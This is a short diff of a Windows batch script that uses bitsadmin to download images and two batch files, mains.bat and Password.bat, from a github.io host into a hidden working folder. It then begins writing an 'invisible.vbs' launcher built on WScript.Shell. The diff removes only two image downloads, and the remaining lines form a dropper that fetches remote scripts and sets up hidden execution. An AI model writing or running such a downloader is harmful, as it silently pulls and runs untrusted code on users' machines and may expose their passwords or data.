@@ -18,9 +18,6 @@ bitsadmin.exe /transfer "7" https://athdot.github.io/download/7.jpg %USERPROFILE
 
 bitsadmin.exe /transfer "8" https://athdot.github.io/download/8.png %USERPROFILE%\Documents\MASTERFOLDER\8.png
 
-bitsadmin.exe /transfer "9" https://athdot.github.io/download/9.gif %USERPROFILE%\Documents\MASTERFOLDER\mor.gif
-
-bitsadmin.exe /transfer "10" https://athdot.github.io/download/10.jpg %USERPROFILE%\Documents\MASTERFOLDER\trippymeme.jpg
 bitsadmin.exe /transfer "10" https://athdot.github.io/download/mains.bat %USERPROFILE%\Documents\MASTERFOLDER\mains.bat
 bitsadmin.exe /transfer "10" https://athdot.github.io/download/Password.bat %USERPROFILE%\Documents\MASTERFOLDER\Password.bat
 @echo Set shell = WScript.CreateObject("Wscript.Shell")> invisible.vbs
